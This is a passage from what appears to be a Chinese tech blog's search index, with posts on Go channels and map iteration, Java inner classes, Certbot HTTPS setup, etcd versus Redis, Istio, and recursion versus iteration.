class="keyword">implements</span> <span class="title class_">Incrementable</span> &#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> &#123;</span><br><span class="line">           incr();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   Incrementable <span class="title function_">getCallbackReference</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Closure</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>　　我们可以用内部类来实现接口，这样就不会与外围类的方法冲突了。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>认证 Cookie 失效问题</title>
    <url>/2019/04/auth-cookie/</url>
    <content><![CDATA[<h2 id="使用域名登陆-Cookie-失效-？"><a href="#使用域名登陆-Cookie-失效-？" class="headerlink" title="使用域名登陆 Cookie 失效 ？"></a>使用域名登陆 Cookie 失效 ？</h2><p>框架使用 Cookie_Only 或者 Cookie_Secure 后，域名登陆的时候必须加入 SSL 证书，使用 Https。</p>
<span id="more"></span>

<p>双重 Cookie 的情况是因为，<span class="exturl" data-url="aHR0cDovL3d3dy5leGFtcGxlLmNvbS8=">www.example.com<i class="fa fa-external-link-alt"></i></span> 生成了一次 Cookie, .example.com 又生成一次 Cookie ?</p>
<p>框架在使用 Cookie_Path 之后，必须加入 Cookie_Domain 才能生成一次 Cookie。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title>Cerbot 在 Ubuntu 上，自动生成 Https 证书</title>
    <url>/2019/04/nginx-cerbot/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>随着互联网的发展，对网站数据的安全性要求越来越高。</p>
<p>SSL 证书使用 RSA 协议，对数据做了一层加密。</p>
<span id="more"></span>

<p><span class="exturl" data-url="aHR0cHM6Ly9jZXJ0Ym90LmVmZi5vcmcvbGV0cy1lbmNyeXB0L3VidW50dXhlbmlhbC1uZ2lueA==">Cerbot<i class="fa fa-external-link-alt"></i></span> 对一些证书做了封装，一键即可安装免费的证书，下面介绍一些命令。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install software-properties-common</span><br><span class="line">$ sudo<span class="built_in"> add-apt-repository </span>universe</span><br><span class="line">$ sudo<span class="built_in"> add-apt-repository </span>ppa:certbot/certbot</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install certbot python-certbot-nginx</span><br><span class="line">$ sudo certbot --nginx</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Cerbot</tag>
      </tags>
  </entry>
  <entry>
    <title>一个协程中 Go 无缓冲的通道会产生僵局</title>
    <url>/2019/09/go-channels/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>我相信这是一个简单的解释，这个微不足道的情况，但我是新来的并发模型。</p>
<p>当我运行这个例子</p>
<span id="more"></span>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)    </span><br><span class="line">    c &lt;- <span class="number">1</span>   </span><br><span class="line">    fmt.Println(&lt;-c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我得到这个错误：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">fatal error: all goroutines are asleep - deadlock!</span><br><span class="line"></span><br><span class="line">goroutine <span class="number">1</span> [chan send]:</span><br><span class="line">main.main()</span><br><span class="line">    <span class="regexp">/home/</span>tarrsalah<span class="regexp">/src/g</span>o<span class="regexp">/src/gi</span>thub.com<span class="regexp">/tarrsalah/</span>tour.golang.org/<span class="number">65</span>.go:<span class="number">8</span> +<span class="number">0</span>x52</span><br><span class="line"><span class="keyword">exit</span> status <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>为什么？</p>
<p>在goroutine中包装 c &lt;- ，使得示例按照我们的预期运行</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)        </span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">       c &lt;- <span class="number">1</span></span><br><span class="line">    &#125;()</span><br><span class="line">    fmt.Println(&lt;-c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再一次，为什么？</p>
<p>请，我需要深入的解释，而不仅仅是如何消除死锁和修复代码。最佳答案：</p>
<p>从 <span class="exturl" data-url="aHR0cDovL2dvbGFuZy5vcmcvZG9jL2VmZmVjdGl2ZV9nby5odG1sI2NoYW5uZWxz">the documentation<i class="fa fa-external-link-alt"></i></span>：</p>
<blockquote>
<p>If the channel is unbuffered, the sender blocks until the receiver has received the value. If the channel has a buffer, the sender blocks only until the value<br>has been copied to the buffer; if the buffer is full, this means<br>waiting until some receiver has retrieved a value.</p>
</blockquote>
<p>否则说</p>
<ol>
<li>当一个频道已满时，发送方等待另一个频道通过接收取得一些空间</li>
<li>你可以看到一个没有缓冲的频道作为一个完整的频道：必须有另一个goroutine来采取发送方发送。</li>
</ol>
<p>这一行</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">c</span> <span class="operator">&lt;-</span> 1</span><br></pre></td></tr></table></figure>

<p>因为通道是无缓冲的。由于没有其他goroutine收到的价值，情况无法解决，这是一个僵局。</p>
<p>您可以通过更改频道创建来阻止它</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>) </span><br></pre></td></tr></table></figure>

<p>因此在阻塞之前，通道中有一个项目有空间。</p>
<p>但这不是并发的。通常，您不会使用没有其他goroutine的频道来处理您放入的内容。你可以这样定义一个接收goroutine：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)    </span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;received:&quot;</span>, &lt;-c)</span><br><span class="line">    &#125;()</span><br><span class="line">    c &lt;- <span class="number">1</span>   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cDovL3BsYXkuZ29sYW5nLm9yZy9wL0I0eTZJZTNUMGQ=">Demonstration<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Channels</tag>
      </tags>
  </entry>
  <entry>
    <title>打好 Istio 与 OpenStack 和 Kubernetes 的配合</title>
    <url>/2019/10/docker-suit/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>无论如何，容器只会越来越受欢迎。</p>
<p>Olaph Wagoner 在他关于微服务的讨论中引用了一个研究结果。</p>
<span id="more"></span>

<p>2021 年容器收入将达到 35 亿美元，2018 年预计为 15 亿美元。</p>
<p>Waggoner 是 IBM 的一名软件工程师和开发人员，他看好容器。在 OpenInfra Days Vietnam 的演讲中，他概述了微服务、Kubernetes 和 Istio。</p>
<h2 id="小把戏？"><a href="#小把戏？" class="headerlink" title="小把戏？"></a>小把戏？</h2><p>他表示，目前业内尚未就微服务的性质达成共识，但定义的特征包括可独立部署和易于更换。</p>
<p>至于这些服务实际上是不是很小，是有争议的。 “如果你有一个 hello world 应用，如果它所做的只是打印到控制台那么可能会被认为很小。” 他解释道。 “运行整个应用的数据库服务器仍然可以被视为微服务，但我想没有人会认为它小。”</p>
<h2 id="K8S"><a href="#K8S" class="headerlink" title="K8S"></a>K8S</h2><p>Kubernetes 将自己定义为可移植的、可扩展的开源平台，用于管理容器化工作负载和服务，方便声明性配置和自动化。 “简而言之，这是一种管理一堆容器或服务的方式，无论你想要什么，” 他说。</p>
<h2 id="严丝合缝"><a href="#严丝合缝" class="headerlink" title="严丝合缝"></a>严丝合缝</h2><p>Istio 是一种开源服务网格，可以透明地分层到现有的分布式应用程序中，允许你连接、保护、控制和观察服务。最后一个定义：服务网格是构成这些分布式应用程序及它们之间交互的微服务网络。</p>
<h2 id="这对用户意味着什么？"><a href="#这对用户意味着什么？" class="headerlink" title="这对用户意味着什么？"></a>这对用户意味着什么？</h2><p>“Istio 扩展了你可以用 Kubernetes 集群做的所有事情。比如：HTTP、gRPC、WebSocket 和 TCP 流量的自动负载均衡；通过丰富的路由规则、重试、故障转移和故障注入，对流量行为进行细粒度控制；可插入的策略层和配置 API，支持访问控制、速率限制和配额；安全的服务到服务身份验证，在集群中的服务之间具有强大的身份断言。</p>
<p>“最酷的事情是指标、日志和痕迹。突然之间，你可以根据随心所欲地阅读日志，并确切知道哪些服务正在互相交流，交流了多少次等。”</p>
<h2 id="Istio"><a href="#Istio" class="headerlink" title="Istio"></a>Istio</h2><p>Istio 的主要组成部分有：Envoy、Pilot、Citidel (istio-auth)、Mixer。</p>
<h2 id="深入了解细节"><a href="#深入了解细节" class="headerlink" title="深入了解细节"></a>深入了解细节</h2><p>Wagoner 详细介绍了 Istio 如何与 OpenStack 合作以及为什么值得这么做。</p>
<p>一旦你用上了 Kubernetes 并在其之上安装了 Istio，K8s 管理员就可以使用 OpenStack API 创建一个集群。OpenStack 中的 K8s 用户可以只使用集群，而无法看到所有在幕后进行繁重工作的 API。现在，由于 Kubernetes OpenStack 云提供商的所作所为，这一切成为可能。“Kubernetes 服务有时需要来自底层云、服务、端点等的东西。这就是目标。”Ingress（Mixer 的一部分）是一个很好的例子，它依赖于 OpenStack Cloud Provider 进行负载均衡并添加结束点。</p>
<p>“这是我最喜欢的部分，为什么你想让 OpenStack 首先运行 Kubernetes（网格扩展的想法）。你有了你的云，你已经在你的 OpenStack 云上运行 Kubernetes，它会告诉你集群正在做的一切。你可以展开扩展该服务网格，不仅包括 OpenStack 云中的虚拟机，还包括裸机实例。”</p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>Etcd 和 Redis 的比较和日常使用场景</title>
    <url>/2019/10/etcd-redis/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>个人观点：etcd 的红火来源于 kurbernetes 用 etcd 做服务发现，而 redis 的兴起则来源于 memcache 缓存本身的局限性。</p>
<p>etcd 是一种分布式存储，更强调的是各个节点之间的通信，同步，确保各个节点上数据和事务的一致性。</p>
<span id="more"></span>

<p>使得服务发现工作更稳定，本身单节点的写入能力并不强。</p>
<p>redis 更像是内存型缓存，虽然也有 cluster 做主从同步和读写分离。</p>
<p>但节点间的一致性主要强调的是数据，并不在乎事务，因此读写能力很强，qps 甚至可以达到 10 万 +</p>
<p>两者都是 k-v 存储，但 redis 支持更多的存储模式，包括 KEY，STRING，HMAP，SET，SORTEDSET 等等。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>因此 redis 本身就可以完成一些比如排序的简单逻辑。而 etcd 则支持对 key 的版本记录和 txn 操作和 client 对 key 的 watch，因此适合用做服务发现。</p>
<p>日常使用中，etcd 主要还是做一些事务管理类的，基础架构服务用的比较多，容器类的服务部署是其主流。</p>
<p>而 redis 广泛地使用在缓存服务器方面，用作 mysql 的缓存，通常依据请求量，甚至会做成多级缓存，当然部分情况下也用做存储型 redis 做持续化存储。</p>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
  </entry>
  <entry>
    <title>深究递归和迭代的区别、联系、优缺点及实例对比</title>
    <url>/2019/10/for-while/</url>
    <content><![CDATA[<h2 id="1-概念区分"><a href="#1-概念区分" class="headerlink" title="1.概念区分"></a>1.概念区分</h2><p>**递归的基本概念:**程序调用自身的编程技巧称为递归,是函数自己调用自己.</p>
<p>一个函数在其定义中直接或间接调用自身的一种方法,它通常把一个大型的复杂的问题转化为一个与原问题相似的规模较小的问题来解决,可以极大的减少代码量。递归的能力在于用有限的语句来定义对象的无限集合。</p>
<span id="more"></span>

<p>使用递归要注意的有两点:</p>
<p>1)递归就是在过程或函数里面调用自身;</p>
<p>2)在使用递归时,必须有一个明确的递归结束条件,称为递归出口.</p>
<p>递归分为两个阶段:</p>
<p>1)递推:把复杂的问题的求解推到比原问题简单一些的问题的求解;</p>
<p>2)回归:当获得最简单的情况后,逐步返回,依次得到复杂的解.</p>
<p>利用递归可以解决很多问题:如背包问题,汉诺塔问题,…等.</p>
<p>斐波那契数列为:0,1,1,2,3,5…</p>
<p>由于递归引起一系列的函数调用,并且有可能会有一系列的重复计算,递归算法的执行效率相对较低.</p>
<p>**迭代:**利用变量的原值推算出变量的一个新值.如果递归是自己调用自己的话,迭代就是A不停的调用B.</p>
<h2 id="2-辩证看递归和迭代"><a href="#2-辩证看递归和迭代" class="headerlink" title="2.辩证看递归和迭代"></a>2.辩证看递归和迭代</h2><p>所谓递归，简而言之就是应用程序自身调用自身，以实现层次数据结构的查询和访问。递归的使用可以使代码更简洁清晰，可读性更好（对于初学者到不见得），但由于递归需要系统堆栈，所以空间消耗要比非递归代码要大很多，而且，如果递归深度太大，可能系统资源会不够用。</p>
<p>往往有这样的观点：能不用递归就不用递归，递归都可以用迭代来代替。</p>
<p>诚然，在理论上，递归和迭代在时间复杂度方面是等价的（在不考虑函数调用开销和函数调用产生的堆栈开销），但实际上递归确实效率比迭代低，既然这样，递归没有任何优势，那么是不是就，没有使用递归的必要了，那递归的存在有何意义呢？</p>
<p>万物的存在是需要时间的检验的，递归没有被历史所埋没，即有存在的理由。从理论上说，所有的递归函数都可以转换为迭代函数，反之亦然，然而代价通常都是比较高的。但从算法结构来说，递归声明的结构并不总能够转换为迭代结构，原因在于结构的引申本身属于递归的概念，用迭代的方法在设计初期根本无法实现，这就像动多态的东西并不总是可以用静多态的方法实现一样。这也是为什么在结构设计时，通常采用递归的方式而不是采用迭代的方式的原因，一个极典型的例子类似于链表，使用递归定义及其简单，但对于内存定义(数组方式)其定义及调用处理说明就变得很晦涩，尤其是在遇到环链、图、网格等问题时，使用迭代方式从描述到实现上都变得不现实。因而可以从实际上说，所有的迭代可以转换为递归，但递归不一定可以转换为迭代。</p>
<p>采用递归算法需要的前提条件是，当且仅当一个存在预期的收敛时，才可采用递归算法，否则，就不能使用递归算法。</p>
<p>递归其实是方便了程序员难为了机器，递归可以通过数学公式很方便的转换为程序。其优点就是易理解，容易编程。但递归是用栈机制实现的，每深入一层，都要占去一块栈数据区域，对嵌套层数深的一些算法，递归会力不从心，空间上会以内存崩溃而告终，而且递归也带来了大量的函数调用，这也有许多额外的时间开销。所以在深度大时，它的时空性就不好了。</p>
<p>而迭代虽然效率高，运行时间只因循环次数增加而增加，没什么额外开销，空间上也没有什么增加，但缺点就是不容易理解，编写复杂问题时困难。</p>
<p>因而，“能不用递归就不用递归，递归都可以用迭代来代替”这样的理解，还是辩证的来看待，不可一棍子打死。</p>
<p>1,2部分摘自网络，略有改动，向原作者致敬！</p>
<h2 id="3-个人总结"><a href="#3-个人总结" class="headerlink" title="3.个人总结"></a>3.个人总结</h2><table>
<thead>
<tr>
<th></th>
<th>定义</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>递归</td>
<td>程序调用自身的编程技巧称为递归</td>
<td>1）大问题化为小问题,可以极大的减少代码量；2）用有限的语句来定义对象的无限集合；3）代码更简洁清晰，可读性更好</td>
<td>1）递归调用函数,浪费空间；2）递归太深容易造成堆栈的溢出；</td>
</tr>
<tr>
<td>迭代</td>
<td>利用变量的原值推算出变量的一个新值，迭代就是A不停的调用B.</td>
<td>1）迭代效率高，运行时间只因循环次数增加而增加；2）没什么额外开销，空间上也没有什么增加</td>
<td>1） 不容易理解；2） 代码不如递归简洁；3） 编写复杂问题时困难。</td>
</tr>
<tr>
<td>二者关系</td>
<td>1） 递归中一定有迭代,但是迭代中不一定有递归,大部分可以相互转换。2） 能用迭代的不用递归,递归调用函数,浪费空间,并且递归太深容易造成堆栈的溢出.&#x2F;<em>相对</em>&#x2F;</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="举例如下"><a href="#举例如下" class="headerlink" title="举例如下"></a>举例如下</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//迭代实现斐波那契数列  </span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">fab_iteration</span><span class="params">(<span class="type">int</span> index)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(index == <span class="number">1</span> || index == <span class="number">2</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">long</span> f1 = <span class="number">1L</span>;  </span><br><span class="line">        <span class="type">long</span> f2 = <span class="number">1L</span>;  </span><br><span class="line">        <span class="type">long</span> f3 = <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; index<span class="number">-2</span>; i++)  </span><br><span class="line">        &#123;     </span><br><span class="line">            f3 = f1 + f2; <span class="comment">//利用变量的原值推算出变量的一个新值  </span></span><br><span class="line">            f1 = f2;  </span><br><span class="line">            f2 = f3;  </span><br><span class="line">        &#125;  </span><br><span class="line">         <span class="keyword">return</span> f3;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//递归实现斐波那契数列  </span></span><br><span class="line"> <span class="function"><span class="type">long</span> <span class="title">fab_recursion</span><span class="params">(<span class="type">int</span> index)</span>  </span></span><br><span class="line"><span class="function"> </span>&#123;      </span><br><span class="line">    <span class="keyword">if</span>(index == <span class="number">1</span> || index == <span class="number">2</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">fab_recursion</span>(index<span class="number">-1</span>)+<span class="built_in">fab_recursion</span>(index<span class="number">-2</span>);    <span class="comment">//递归求值  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    cout &lt;&lt; <span class="built_in">fab_recursion</span>(<span class="number">10</span>) &lt;&lt; endl;  </span><br><span class="line">    cout &lt;&lt; <span class="built_in">fab_iteration</span>(<span class="number">10</span>) &lt;&lt; endl;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>channel 基本使用</title>
    <url>/2019/10/go-channels/</url>
    <content><![CDATA[<h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>channel 是有类型的管道，可以用 channel 操作符 &lt;- 对其发送或者接收值。</p>
<h2 id="创建-channel"><a href="#创建-channel" class="headerlink" title="创建 channel"></a>创建 channel</h2><span id="more"></span>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>注意：管道必须指定类型，比如这里是 int，即往管道里传送的数据只能是 int 类型。当然可以是 interface {} 这种空接口方式，这样就可以传送各种数据类型了</p>
<p>也可以用 var 来声明管道，但是好像没啥意义</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> c <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%T %v\n&quot;</span>, c, c)</span><br><span class="line">    d := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%T %v\n&quot;</span>, d, d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">chan</span> <span class="type">int</span> &lt;<span class="literal">nil</span>&gt;</span><br><span class="line"><span class="keyword">chan</span> <span class="type">int</span> <span class="number">0xc42006e060</span></span><br></pre></td></tr></table></figure>

<h2 id="管道方向"><a href="#管道方向" class="headerlink" title="管道方向"></a>管道方向</h2><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">ch &lt;- v // <span class="built_in">Send</span> v <span class="keyword">to</span> channel ch. v := &lt;-ch // Receive from ch, <span class="literal">and</span> // <span class="built_in">assign</span> value <span class="keyword">to</span> v.</span><br></pre></td></tr></table></figure>

<p>“箭头” 就是数据流的方向</p>
<p>注意接受时候 &lt;- 和 chan 变量之间没有空格，虽然有空格也不会报错，但是 ide 会提示，因此还是依照规范不空格比较好</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(i <span class="type">int</span>, c <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123; </span><br><span class="line">    c &lt;- i fmt.Println(<span class="string">&quot;send:&quot;</span>, i) </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>) </span><br><span class="line">    <span class="keyword">go</span> foo(<span class="number">0</span>, c) </span><br><span class="line">    res := &lt;-c fmt.Println(<span class="string">&quot;receive:&quot;</span>, res) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">send</span>: <span class="number">0</span></span><br><span class="line"><span class="attribute">receive</span>: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>默认情况下，在另一端准备好之前，发送和接收都会阻塞。这使得 goroutine 可以在没有明确的锁或竞态变量的情况下进行同步。</p>
<p>发动和接收数据应当在并行线上，而不能是串行的，因为发送和接收都会阻塞，如果串行，就会死锁（就是一个一直阻塞在那等对端），但不用为此操心，因为 go 在执行时候（编译会通过）会报错，比如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    c &lt;- <span class="number">0</span></span><br><span class="line">    &lt;-c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fatal</span> <span class="literal">error</span>: all goroutines are asleep - deadlock!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Channels</tag>
      </tags>
  </entry>
  <entry>
    <title>遍历map时的key随机化问题及解决方法</title>
    <url>/2019/10/go-maps-looping/</url>
    <content><![CDATA[<h2 id="Go的map在底层是用hashmap实现的"><a href="#Go的map在底层是用hashmap实现的" class="headerlink" title="Go的map在底层是用hashmap实现的"></a>Go的map在底层是用hashmap实现的</h2><p>由于高效的hash函数肯定不是对key做顺序散列的，所以与其它语言实现的hashmap类似，在使用Go语言map过程中，key-value的插入顺序与遍历map时key的访问顺序是不相同的。</p>
<p>熟悉hashmap的同学对这个情况应该非常清楚。  </p>
<span id="more"></span>

<p>所以，本文要提到的肯定不是这个，而是一个比较让人惊奇的情况，下面开始说明。</p>
<h2 id="1-通过range遍历map时，key的顺序被随机化"><a href="#1-通过range遍历map时，key的顺序被随机化" class="headerlink" title="1. 通过range遍历map时，key的顺序被随机化"></a>1. 通过range遍历map时，key的顺序被随机化</h2><p>在golang 1.4版本中，借助关键字range对Go语言的map做遍历访问时，前后两轮遍历访问到的key的顺序居然是被随机化的！  </p>
<p>这个现象在其它语言中是很少见的，比如C语言实现hashmap时，通常会用数组（即一段连续的内存空间）来存key，虽然key的分布顺序与插入顺序不一致，但k-v数据填充完毕后，整个hashmap的key的次序是固定的，所以，后续遍历这个hashmap时，每轮遍历访问到的key的顺序是一致的。  </p>
<p>但Go语言通过range遍历map时，确实会对map的key顺序做随机化。下面是一段简单的验证程序。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// map_range_rand.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span><br><span class="line">    m[<span class="string">&quot;hello&quot;</span>] = <span class="string">&quot;echo hello&quot;</span></span><br><span class="line">    m[<span class="string">&quot;world&quot;</span>] = <span class="string">&quot;echo world&quot;</span></span><br><span class="line">    m[<span class="string">&quot;go&quot;</span>] = <span class="string">&quot;echo go&quot;</span></span><br><span class="line">    m[<span class="string">&quot;is&quot;</span>] = <span class="string">&quot;echo is&quot;</span></span><br><span class="line">    m[<span class="string">&quot;cool&quot;</span>] = <span class="string">&quot;echo cool&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;k=%v, v=%v\n&quot;</span>, k, v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在go v1.4环境中，执行go build map_range_rand.go完成编译后，运行产出的2进制文件，结果如下。 第1次运行输出</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ ./map\_range\_rand   </span><br><span class="line"><span class="attribute">k</span>=is, <span class="attribute">v</span>=echo is  </span><br><span class="line"><span class="attribute">k</span>=cool, <span class="attribute">v</span>=echo cool  </span><br><span class="line"><span class="attribute">k</span>=hello, <span class="attribute">v</span>=echo hello  </span><br><span class="line"><span class="attribute">k</span>=world, <span class="attribute">v</span>=echo world  </span><br><span class="line"><span class="attribute">k</span>=go, <span class="attribute">v</span>=echo go  </span><br></pre></td></tr></table></figure>

<p>第2次运行输出</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ ./map\_range\_rand   </span><br><span class="line"><span class="attribute">k</span>=go, <span class="attribute">v</span>=echo go  </span><br><span class="line"><span class="attribute">k</span>=is, <span class="attribute">v</span>=echo is  </span><br><span class="line"><span class="attribute">k</span>=cool, <span class="attribute">v</span>=echo cool  </span><br><span class="line"><span class="attribute">k</span>=hello, <span class="attribute">v</span>=echo hello  </span><br><span class="line"><span class="attribute">k</span>=world, <span class="attribute">v</span>=echo world</span><br></pre></td></tr></table></figure>

<p>第3次运行输出</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ ./map\_range\_rand   </span><br><span class="line"><span class="attribute">k</span>=hello, <span class="attribute">v</span>=echo hello  </span><br><span class="line"><span class="attribute">k</span>=world, <span class="attribute">v</span>=echo world  </span><br><span class="line"><span class="attribute">k</span>=go, <span class="attribute">v</span>=echo go  </span><br><span class="line"><span class="attribute">k</span>=is, <span class="attribute">v</span>=echo is  </span><br><span class="line"><span class="attribute">k</span>=cool, <span class="attribute">v</span>=echo cool</span><br></pre></td></tr></table></figure>
<p>可以很清楚地看到，每次遍历时，key的顺序都是不同的。</p>
